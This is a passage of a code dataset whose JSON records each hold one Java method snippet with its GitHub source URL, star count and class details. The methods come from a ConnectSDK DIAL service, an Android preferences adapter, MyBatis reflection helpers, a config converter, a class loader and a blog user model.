"DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "launchAppStore", "params": ["String", "AppLaunchListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchAppStore(String appId, AppLaunchListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getAppState", "params": ["String", "AppStateListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void getAppState(String appName, final AppStateListener listener) {        ResponseListener<Object> responseListener = new ResponseListener<Object>() {            @Override            public void onSuccess(Object response) {                String str = (String)response;                String[] stateTAG = new String[2];                stateTAG[0] = \"<state>\";                stateTAG[1] = \"</state>\";                int start = str.indexOf(stateTAG[0]);                int end = str.indexOf(stateTAG[1]);                if (start != -1 && end != -1) {                    start += stateTAG[0].length();                    String state = str.substring(start, end);                    AppState appState = new AppState(\"running\".equals(state), \"running\".equals(state));                    Util.postSuccess(listener, appState);                    // TODO: This isn't actually reporting anything.//                    if (listener != null) //                        listener.onAppStateSuccess(state);                } else {                    Util.postError(listener, new ServiceCommandError(0, \"Malformed response for app state\", null));                }            }            @Override            public void onError(ServiceCommandError error) {                Util.postError(listener, error);            }        };        String uri = requestURL(appName);        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, responseListener);        request.setHttpMethod(ServiceCommand.TYPE_GET);        request.send();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getAppList", "params": ["AppListListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAppList(AppListListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getRunningApp", "params": ["AppInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getRunningApp(AppInfoListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "subscribeRunningApp", "params": ["AppInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<AppInfoListener>", "snippet": "    public ServiceSubscription<AppInfoListener> subscribeRunningApp(AppInfoListener listener) {        Util.postError(listener, ServiceCommandError.notSupported());        return new NotSupportedServiceSubscription<AppInfoListener>();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "getAppState", "params": ["LaunchSession", "AppStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAppState(LaunchSession launchSession, AppStateListener listener) {        // TODO Auto-generated method stub    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "subscribeAppState", "params": ["LaunchSession", "com"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<AppStateListener>", "snippet": "    public ServiceSubscription<AppStateListener> subscribeAppState(            LaunchSession launchSession,            com.connectsdk.service.capability.Launcher.AppStateListener listener) {        // TODO Auto-generated method stub        return null;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "closeLaunchSession", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeLaunchSession(LaunchSession launchSession, ResponseListener<Object> listener) {        if (launchSession.getSessionType() == LaunchSessionType.App) {            this.getLauncher().closeApp(launchSession, listener);        } else        {            Util.postError(listener, new ServiceCommandError(-1, \"Could not find a launcher associated with this LaunchSession\", launchSession));        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "isConnectable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnectable() {        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "isConnected", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnected() {        return connected;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "connect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connect() {        //  TODO:  Fix this for roku.  Right now it is using the InetAddress reachable function.  Need to use an HTTP Method.//        mServiceReachability = DeviceServiceReachability.getReachability(serviceDescription.getIpAddress(), this);//        mServiceReachability.start();        connected = true;        reportConnected(true);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "disconnect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void disconnect() {        connected = false;        if (mServiceReachability != null)            mServiceReachability.stop();        Util.runOnUI(new Runnable() {            @Override            public void run() {                if (listener != null)                    listener.onDisconnect(DIALService.this, null);            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "onLoseReachability", "params": ["DeviceServiceReachability"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLoseReachability(DeviceServiceReachability reachability) {        if (connected) {            disconnect();        } else {            mServiceReachability.stop();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "sendCommand", "params": ["ServiceCommand<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendCommand(final ServiceCommand<?> mCommand) {        Util.runInBackground(new Runnable() {            @SuppressWarnings(\"unchecked\")            @Override            public void run() {                ServiceCommand<ResponseListener<Object>> command = (ServiceCommand<ResponseListener<Object>>) mCommand;                Object payload = command.getPayload();                try {                    HttpConnection connection = createHttpConnection(mCommand.getTarget());                    if (payload != null && command.getHttpMethod().equalsIgnoreCase(ServiceCommand.TYPE_POST)) {                        connection.setHeader(HttpMessage.CONTENT_TYPE_HEADER, \"text/plain; charset=\\\"utf-8\\\"\");                        connection.setMethod(HttpConnection.Method.POST);                        connection.setPayload(payload.toString());                    } else if (command.getHttpMethod().equalsIgnoreCase(ServiceCommand.TYPE_DEL)) {                        connection.setMethod(HttpConnection.Method.DELETE);                    }                    connection.execute();                    int code = connection.getResponseCode();                    if (code == 200) {                        Util.postSuccess(command.getResponseListener(), connection.getResponseString());                    } else if (code == 201) {                        Util.postSuccess(command.getResponseListener(), connection.getResponseHeader(\"Location\"));                    } else {                        Util.postError(command.getResponseListener(), ServiceCommandError.getError(code));                    }                } catch (Exception e) {                    Util.postError(command.getResponseListener(), new ServiceCommandError(0, e.getMessage(), null));                }            }        });    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "createHttpConnection", "params": ["String"], "throws": ["IOException"], "modifiers": [], "return_type": "HttpConnection", "snippet": "    HttpConnection createHttpConnection(String target) throws IOException {        return HttpConnection.newInstance(URI.create(target));    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "requestURL", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String requestURL(String appName) {        String applicationURL = serviceDescription != null ? serviceDescription.getApplicationURL() : null;        if (applicationURL == null) {            throw new IllegalStateException(\"DIAL service application URL not available\");        }        StringBuilder sb = new StringBuilder();        sb.append(applicationURL);        if (!applicationURL.endsWith(\"/\"))            sb.append(\"/\");        sb.append(appName);        return sb.toString();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "updateCapabilities", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateCapabilities() {        List<String> capabilities = new ArrayList<String>();        capabilities.add(Application);        capabilities.add(Application_Params);        capabilities.add(Application_Close);        capabilities.add(AppState);        setCapabilities(capabilities);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "hasApplication", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void hasApplication(String appID, ResponseListener<Object> listener) {        String uri = requestURL(appID);        ServiceCommand<ResponseListener<Object>> command = new ServiceCommand<ResponseListener<Object>>(this, uri, null, listener);        command.setHttpMethod(ServiceCommand.TYPE_GET);        command.send();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "probeForAppSupport", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void probeForAppSupport() {        if (serviceDescription.getApplicationURL() == null) {            Log.d(Util.T, \"unable to check for installed app; no service application url\");            return;        }        for (final String appID : registeredApps) {            hasApplication(appID, new ResponseListener<Object>() {                @Override public void onError(ServiceCommandError error) { }                @Override                public void onSuccess(Object object) {                    addCapability(\"Launcher.\" + appID);                    addCapability(\"Launcher.\" + appID + \".Params\");                }            });        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/DIALService.java", "stars": "4", "class": {"name": "DIALService", "extends": "DeviceService", "implements": ["Launcher"], "modifiers": ["public"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "RecyclerView", "snippet": "    public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {        View v;        switch (viewType) {            case HEADER:                v = LayoutInflater.from(parent.getContext()).inflate(R.layout.list_subheader, parent, false);                return new PreferencesListAdapter.HeaderHolder(v);            case NORMAL:            default:                v = LayoutInflater.from(parent.getContext()).inflate(R.layout.list_icon_twoline_item, parent, false);                return new PreferencesListAdapter.ViewHolder(v);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/PreferencesListAdapter.java", "stars": "4", "class": {"name": "PreferencesListAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBindViewHolder", "params": ["RecyclerView", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(RecyclerView.ViewHolder viewHolder, int position) {        if (getItemViewType(position) == NORMAL) {            ViewHolder itemViewHolder = (ViewHolder) viewHolder;            PrefItem item = mItems.get(position);            itemViewHolder.itemView.setClickable(item.isClickable());            itemViewHolder.icon.setImageResource(item.getIconResource());            itemViewHolder.icon.setColorFilter(ButterApplication.getAppContext().getResources().getColor(R.color.text_color), PorterDuff.Mode.SRC_IN);            itemViewHolder.text1.setText(item.getTitle());            itemViewHolder.text2.setText(item.getSubtitle());            if (item.getDefaultValue() instanceof Boolean) {                itemViewHolder.checkBox.setVisibility(View.VISIBLE);                itemViewHolder.checkBox.setChecked((boolean) item.getValue());            } else {                itemViewHolder.checkBox.setVisibility(View.GONE);            }        } else if (getItemViewType(position) == HEADER) {            HeaderHolder headerViewHolder = (HeaderHolder) viewHolder;            headerViewHolder.itemView.setText(mItems.get(position).getTitle());        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/PreferencesListAdapter.java", "stars": "4", "class": {"name": "PreferencesListAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {        return mItems.size();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/PreferencesListAdapter.java", "stars": "4", "class": {"name": "PreferencesListAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemViewType", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemViewType(int position) {        if (mItems.get(position).isTitle()) {            return HEADER;        }        return NORMAL;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/PreferencesListAdapter.java", "stars": "4", "class": {"name": "PreferencesListAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View view) {            int position = getPosition();            PrefItem item = (PrefItem) mItems.get(position);            item.onClick();        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/PreferencesListAdapter.java", "stars": "4", "class": {"name": "ViewHolder", "extends": "RecyclerView", "implements": ["View"], "modifiers": ["public"]}}, {"method_name": "forClass", "params": ["Class<?>", "ReflectorFactory"], "throws": null, "modifiers": ["public", "static"], "return_type": "MetaClass", "snippet": "  public static MetaClass forClass(Class<?> type, ReflectorFactory reflectorFactory) {    return new MetaClass(type, reflectorFactory);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "metaClassForProperty", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "MetaClass", "snippet": "  public MetaClass metaClassForProperty(String name) {    Class<?> propType = reflector.getGetterType(name);    return MetaClass.forClass(propType, reflectorFactory);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "findProperty", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String findProperty(String name) {    StringBuilder prop = buildProperty(name, new StringBuilder());    return prop.length() > 0 ? prop.toString() : null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "findProperty", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String findProperty(String name, boolean useCamelCaseMapping) {    if (useCamelCaseMapping) {      name = name.replace(\"_\", \"\");    }    return findProperty(name);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGetterNames", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getGetterNames() {    return reflector.getGetablePropertyNames();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSetterNames", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] getSetterNames() {    return reflector.getSetablePropertyNames();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSetterType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getSetterType(String name) {    PropertyTokenizer prop = new PropertyTokenizer(name);    if (prop.hasNext()) {      MetaClass metaProp = metaClassForProperty(prop.getName());      return metaProp.getSetterType(prop.getChildren());    } else {      return reflector.getSetterType(prop.getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGetterType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> getGetterType(String name) {    PropertyTokenizer prop = new PropertyTokenizer(name);    if (prop.hasNext()) {      MetaClass metaProp = metaClassForProperty(prop);      return metaProp.getGetterType(prop.getChildren());    }    // issue #506. Resolve the type inside a Collection Object    return getGetterType(prop);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "metaClassForProperty", "params": ["PropertyTokenizer"], "throws": null, "modifiers": ["private"], "return_type": "MetaClass", "snippet": "  private MetaClass metaClassForProperty(PropertyTokenizer prop) {    Class<?> propType = getGetterType(prop);    return MetaClass.forClass(propType, reflectorFactory);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGetterType", "params": ["PropertyTokenizer"], "throws": null, "modifiers": ["private"], "return_type": "Class<?>", "snippet": "  private Class<?> getGetterType(PropertyTokenizer prop) {    Class<?> type = reflector.getGetterType(prop.getName());    if (prop.getIndex() != null && Collection.class.isAssignableFrom(type)) {      Type returnType = getGenericGetterType(prop.getName());      if (returnType instanceof ParameterizedType) {        Type[] actualTypeArguments = ((ParameterizedType) returnType).getActualTypeArguments();        if (actualTypeArguments != null && actualTypeArguments.length == 1) {          returnType = actualTypeArguments[0];          if (returnType instanceof Class) {            type = (Class<?>) returnType;          } else if (returnType instanceof ParameterizedType) {            type = (Class<?>) ((ParameterizedType) returnType).getRawType();          }        }      }    }    return type;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGenericGetterType", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Type", "snippet": "  private Type getGenericGetterType(String propertyName) {    try {      Invoker invoker = reflector.getGetInvoker(propertyName);      if (invoker instanceof MethodInvoker) {        Field _method = MethodInvoker.class.getDeclaredField(\"method\");        _method.setAccessible(true);        Method method = (Method) _method.get(invoker);        return TypeParameterResolver.resolveReturnType(method, reflector.getType());      } else if (invoker instanceof GetFieldInvoker) {        Field _field = GetFieldInvoker.class.getDeclaredField(\"field\");        _field.setAccessible(true);        Field field = (Field) _field.get(invoker);        return TypeParameterResolver.resolveFieldType(field, reflector.getType());      }    } catch (NoSuchFieldException | IllegalAccessException ignored) {    }    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasSetter", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasSetter(String name) {    PropertyTokenizer prop = new PropertyTokenizer(name);    if (prop.hasNext()) {      if (reflector.hasSetter(prop.getName())) {        MetaClass metaProp = metaClassForProperty(prop.getName());        return metaProp.hasSetter(prop.getChildren());      } else {        return false;      }    } else {      return reflector.hasSetter(prop.getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasGetter", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasGetter(String name) {    PropertyTokenizer prop = new PropertyTokenizer(name);    if (prop.hasNext()) {      if (reflector.hasGetter(prop.getName())) {        MetaClass metaProp = metaClassForProperty(prop);        return metaProp.hasGetter(prop.getChildren());      } else {        return false;      }    } else {      return reflector.hasGetter(prop.getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGetInvoker", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Invoker", "snippet": "  public Invoker getGetInvoker(String name) {    return reflector.getGetInvoker(name);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSetInvoker", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Invoker", "snippet": "  public Invoker getSetInvoker(String name) {    return reflector.getSetInvoker(name);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "buildProperty", "params": ["String", "StringBuilder"], "throws": null, "modifiers": ["private"], "return_type": "StringBuilder", "snippet": "  private StringBuilder buildProperty(String name, StringBuilder builder) {    PropertyTokenizer prop = new PropertyTokenizer(name);    if (prop.hasNext()) {      String propertyName = reflector.findPropertyName(prop.getName());      if (propertyName != null) {        builder.append(propertyName);        builder.append(\".\");        MetaClass metaProp = metaClassForProperty(propertyName);        metaProp.buildProperty(prop.getChildren(), builder);      }    } else {      String propertyName = reflector.findPropertyName(name);      if (propertyName != null) {        builder.append(propertyName);      }    }    return builder;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hasDefaultConstructor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasDefaultConstructor() {    return reflector.hasDefaultConstructor();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/MetaClass.java", "stars": "15", "class": {"name": "MetaClass", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "convertTo", "params": ["Map<String,LimitMode>", "ConversionInfo"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> convertTo(Map<String, LimitMode> entries, ConversionInfo conversionInfo) {        return entries.entrySet().stream()                .collect(toMap(Map.Entry::getKey, o -> o.getValue().toString()));    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/config/LimitModeMapConverter.java", "stars": "3", "class": {"name": "LimitModeMapConverter", "extends": null, "implements": ["Converter"], "modifiers": ["public"]}}, {"method_name": "convertFrom", "params": ["Map<String,String>", "ConversionInfo"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,LimitMode>", "snippet": "    public Map<String, LimitMode> convertFrom(Map<String, String> entries, ConversionInfo conversionInfo) {        return entries.entrySet().stream()                .collect(toMap(Map.Entry::getKey, o -> EnumUtils.getEnumFromString(LimitMode.class, o.getValue())));    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slimits/config/LimitModeMapConverter.java", "stars": "3", "class": {"name": "LimitModeMapConverter", "extends": null, "implements": ["Converter"], "modifiers": ["public"]}}, {"method_name": "defineClass", "params": ["ClassLoader", "byte"], "throws": null, "modifiers": ["static"], "return_type": "Class<?>", "snippet": "    static <T> Class<?> defineClass(ClassLoader parent, byte[] bytes) {        var inst = new AnonClassLoader(parent);        var klass = inst.defineClass(null, bytes, 0, bytes.length);        // load the class as soon as we define it...        try {            Class.forName(klass.getCanonicalName(), true, inst);        } catch (ClassNotFoundException e) {            throw new RuntimeException(e);        }        return klass;    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/runtime/AnonClassLoader.java", "stars": "5", "class": {"name": "AnonClassLoader", "extends": "ClassLoader", "implements": null, "modifiers": ["final"]}}, {"method_name": "getUid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getUid() {        return uid;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUid", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUid(Integer uid) {        this.uid = uid;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUsername", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUsername() {        return username;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUsername", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUsername(String username) {        this.username = username;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPassword", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPassword() {        return password;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPassword", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPassword(String password) {        this.password = password;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEmail", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEmail() {        return email;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEmail", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEmail(String email) {        this.email = email;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHomeUrl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHomeUrl() {        return homeUrl;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setHomeUrl", "params": ["String"], "throws": null, "modifiers": ["public"], 